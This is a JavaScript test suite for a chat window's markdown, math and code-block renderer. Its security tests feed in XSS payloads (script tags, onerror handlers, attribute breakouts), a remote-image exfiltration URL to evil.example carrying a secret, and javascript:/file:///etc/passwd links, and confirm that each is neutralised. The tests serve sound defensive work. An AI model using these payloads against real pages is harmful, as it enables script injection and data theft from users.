// Runs the REAL bundled marked + KaTeX + render.js inside jsdom. (jsdom does not enforce CSP; see the CSP test.)
import test from 'node:test';
import assert from 'node:assert/strict';
import { JSDOM } from 'jsdom';
import { readFileSync } from 'node:fs';
import { fileURLToPath } from 'node:url';
import path from 'node:path';

const dir = path.resolve(path.dirname(fileURLToPath(import.meta.url)), '..');
const pageHtml = readFileSync(path.join(dir, 'chat.html'), 'utf8');

async function page() {
  const dom = new JSDOM(pageHtml, { url: 'file://' + dir + '/chat.html', runScripts: 'dangerously', resources: 'usable' });
  await new Promise((r) => dom.window.addEventListener('load', r));
  const posted = [];
  dom.window.webkit = { messageHandlers: new Proxy({}, { get: (_, name) => ({ postMessage: (v) => posted.push([name, v]) }) }) };
  const root = dom.window.document.getElementById('root');
  return { dom, root, posted, render: (md) => { dom.window.render(md); return root.innerHTML; } };
}

test('the screenshot bug: single-tilde approximations are NOT struck out', async () => {
  const { render, root } = await page();
  render('Mid-High (~$600-800) and budget (~$350-500) cards.\n\n- Best for: gaming ~$1,200\n- Trade-off: ~$300 more');
  assert.equal(root.querySelectorAll('del').length, 0);
  assert.match(root.textContent, /~\$600-800\) and budget \(~\$350-500/);
});

test('real ~~double tilde~~ strikethrough still works', async () => {
  const { render, root } = await page();
  render('this is ~~gone~~ but ~kept~');
  assert.equal(root.querySelectorAll('del').length, 1);
  assert.equal(root.querySelector('del').textContent, 'gone');
});

test('headings, lists, bold/italic, blockquote and rules render as formatted HTML, not symbols', async () => {
  const { render, root } = await page();
  render('## 🏆 Flagship\n\n**NVIDIA RTX 5090** is *fast*.\n\n- one\n- two\n\n1. a\n2. b\n\n> quoted\n\n---\n');
  assert.equal(root.querySelector('h2').textContent, '🏆 Flagship');
  assert.equal(root.querySelector('strong').textContent, 'NVIDIA RTX 5090'); assert.equal(root.querySelector('em').textContent, 'fast');
  assert.equal(root.querySelectorAll('ul li').length, 2); assert.equal(root.querySelectorAll('ol li').length, 2);
  assert.ok(root.querySelector('blockquote')); assert.ok(root.querySelector('hr'));
  assert.ok(!/##|\*\*|^- /m.test(root.textContent), 'no raw markdown markers should remain');
});

test('tables render as real tables inside a scroll wrapper', async () => {
  const { render, root } = await page();
  render('| GPU | Best For | Price |\n|---|---|---|\n| **RTX 5090** | 4K | $1,200+ |\n| RX 9070 XT | 1440p | $600 |');
  assert.equal(root.querySelectorAll('.table-wrap table').length, 1);
  assert.equal(root.querySelectorAll('thead th').length, 3); assert.equal(root.querySelectorAll('tbody tr').length, 2);
  assert.equal(root.querySelector('tbody td strong').textContent, 'RTX 5090');
  assert.ok(!/\|---/.test(root.textContent));
});

test('code blocks are escaped, labelled, and have a Copy button that posts the exact code', async () => {
  const { render, root, posted } = await page();
  render('```python\nprint("<b>hi</b>") # $x$ stays code\n```\n\ninline `a_b $y$` too');
  assert.equal(root.querySelector('.code-bar span').textContent, 'python');
  assert.equal(root.querySelector('pre code').textContent, 'print("<b>hi</b>") # $x$ stays code');
  assert.equal(root.querySelectorAll('.katex').length, 0, 'math inside code must stay code');
  root.querySelector('button.copy').click();
  assert.deepEqual(posted.filter(([n]) => n === 'copy')[0], ['copy', 'print("<b>hi</b>") # $x$ stays code']);
});

// ---------------- math ----------------
test('inline and display math are typeset by KaTeX in every common delimiter style', async () => {
  const { render, root } = await page();
  render('Inline $x^2 + y^2 = z^2$ and \\(a_1 + b_2\\).\n\n$$\\int_0^1 x\\,dx = \\frac{1}{2}$$\n\n\\[E = mc^2\\]\n\n\\begin{align}a &= b \\\\ c &= d\\end{align}');
  const m = root.querySelectorAll('.math');
  assert.equal(m.length, 5);
  assert.ok([...m].every((e) => e.querySelector('.katex')), 'every formula should be typeset');
  assert.equal(root.querySelectorAll('.math[data-display="1"]').length, 3);
  assert.ok(root.querySelector('.katex-mathml'), 'accessible MathML is emitted');
  assert.ok(!/\\int|\\frac|\\begin/.test(root.querySelector('.katex-html').textContent), 'no raw TeX in the visible output');
});

test('underscores and asterisks inside math are not turned into italics', async () => {
  const { render, root } = await page();
  render('Let $a_1 * b_2 + c_3$ be given, with _real italics_ outside.');
  assert.equal(root.querySelectorAll('em').length, 1); assert.equal(root.querySelector('em').textContent, 'real italics');
  assert.ok(root.querySelector('.math .katex'));
});

test('prices and currency are NOT mistaken for math', async () => {
  const { render, root } = await page();
  render('The RTX 5090 costs $1,200 and the RX 9070 XT costs $600; a $5 coupon and $20 off, between $100 and $200.\n\nEscaped \\$x\\$ stays text.');
  assert.equal(root.querySelectorAll('.math').length, 0);
  assert.match(root.textContent, /\$1,200 and the RX 9070 XT costs \$600/);
  assert.match(root.textContent, /\$x\$ stays text/);
});

test('a real formula next to a price still works', async () => {
  const { render, root } = await page();
  render('It costs $5 today. Solve $x^2 = 4$ for the price.');
  assert.equal(root.querySelectorAll('.math').length, 1); assert.match(root.textContent, /costs \$5 today/);
});

test('invalid TeX degrades gracefully instead of throwing or blanking the message', async () => {
  const { render, root } = await page();
  assert.doesNotThrow(() => render('Bad: $\\frac{1}{$ and $\\undefinedcommand{x}$ then text after.'));
  assert.match(root.textContent, /text after/);
});

test('math in tables, lists and headings is typeset', async () => {
  const { render, root } = await page();
  render('| Formula | Name |\n|---|---|\n| $a^2+b^2=c^2$ | Pythagoras |\n\n- item $\\alpha$\n\n### Heading $\\beta$');
  assert.equal(root.querySelectorAll('td .math .katex').length, 1);
  assert.equal(root.querySelectorAll('li .math .katex').length, 1); assert.equal(root.querySelectorAll('h3 .math .katex').length, 1);
});

// ---------------- security ----------------
test('raw HTML from the model is shown as text and never becomes live markup', async () => {
  const { render, root } = await page();
  render('<script>window.__pwned=1</script><img src=x onerror="window.__pwned=2"><b onclick="x()">bold</b>\n\n<div>block</div>');
  assert.equal(root.querySelectorAll('script, img, div:not(.code):not(.table-wrap)').length, 0);
  assert.equal(root.querySelector('[onclick], [onerror]'), null);
  assert.equal(page.__pwned, undefined);
  assert.match(root.textContent, /<script>window\.__pwned=1<\/script>/);
});

test('remote images are never loaded (no data-exfiltration channel); they become links', async () => {
  const { render, root } = await page();
  render('![leak](https://evil.example/?q=SECRET) and ![local](./a.png)');
  assert.equal(root.querySelectorAll('img').length, 0);
  const a = root.querySelector('a'); assert.equal(a.getAttribute('href'), 'https://evil.example/?q=SECRET'); assert.match(a.textContent, /Image: leak/);
  assert.match(root.textContent, /\[image: local\]/);
});

test('only http(s) and mailto links survive; javascript:/data:/file: become plain text', async () => {
  const { render, root } = await page();
  render('[ok](https://example.com) [mail](mailto:a@b.c) [js](javascript:alert(1)) [data](data:text/html,x) [file](file:///etc/passwd) [rel](/etc/passwd)');
  const hrefs = [...root.querySelectorAll('a')].map((a) => a.getAttribute('href'));
  assert.deepEqual(hrefs, ['https://example.com', 'mailto:a@b.c']);
  assert.ok([...root.querySelectorAll('a')].every((a) => a.rel.includes('noopener')));
  assert.match(root.textContent, /js data file rel/);
});

test('HTML in attributes/titles/lang cannot break out', async () => {
  const { render, root } = await page();
  render('[x](https://a.example "t\\" onmouseover=\\"alert(1)") \n\n```"><img src=x onerror=alert(1)>\ncode\n```');
  assert.equal(root.querySelectorAll('img').length, 0); assert.equal(root.querySelector('[onmouseover], [onerror]'), null);
});

test('the page ships a strict CSP: no network, no eval, no remote anything', () => {
  const csp = /Content-Security-Policy" content="([^"]+)"/.exec(pageHtml)[1];
  assert.match(csp, /default-src 'none'/); assert.ok(!/unsafe-eval/.test(csp)); assert.ok(!/https?:|\*/.test(csp));
  assert.match(csp, /img-src data:/); assert.ok(!/connect-src/.test(csp) || /connect-src 'none'/.test(csp));
});

// ---------------- robustness & behaviour ----------------
test('streaming: every prefix of a long answer renders without throwing (unclosed fences, tables, $$)', async () => {
  const { render } = await page();
  const full = '## Title\n\n| a | b |\n|---|---|\n| 1 | 2 |\n\n```js\nconst x = 1;\n```\n\nSolve $$\\frac{a}{b}$$ and $x^2$.\n\n- item\n\n\\begin{align}a&=b\\end{align}\n';
  for (let i = 0; i <= full.length; i++) assert.doesNotThrow(() => render(full.slice(0, i)), `prefix length ${i}`);
});

test('large answers render quickly', async () => {
  const { render, root } = await page();
  const big = Array.from({ length: 400 }, (_, i) => `### Section ${i}\n\nText with $x_${i}^2$ and **bold** and \`code\`.\n\n| a | b |\n|--|--|\n| ${i} | ${i * 2} |\n`).join('\n');
  const t0 = Date.now(); render(big); const ms = Date.now() - t0;
  assert.equal(root.querySelectorAll('h3').length, 400); assert.ok(ms < 8000, `took ${ms}ms`);
});

test('height is reported to the host as content grows, and empty/odd input renders nothing without error', async () => {
  const { render, root, posted, dom } = await page();
  root.getBoundingClientRect = () => ({ height: root.textContent.length });          // jsdom has no layout engine: stub one
  render(''); assert.equal(root.innerHTML, '');
  render('hello'); render('hello world, more text'); render('hello world, more text'); // identical height must not repost
  const heights = posted.filter(([n]) => n === 'height').map(([, v]) => v);
  assert.deepEqual(heights, [8, 25]);   // ('hello\n' = 6, 'hello world, more text\n' = 23) + 2px pad; the empty render and the repeated render post nothing
  assert.doesNotThrow(() => dom.window.render(null)); assert.doesNotThrow(() => dom.window.render(undefined));
});

test('non-markdown plain text with symbols is left readable', async () => {
  const { render, root } = await page();
  render('Use a < b and c > d, 5 * 3 = 15, snake_case_name and file_name.txt, 50% & more.');
  assert.match(root.textContent, /a < b and c > d, 5 \* 3 = 15, snake_case_name and file_name\.txt, 50% & more\./);
});
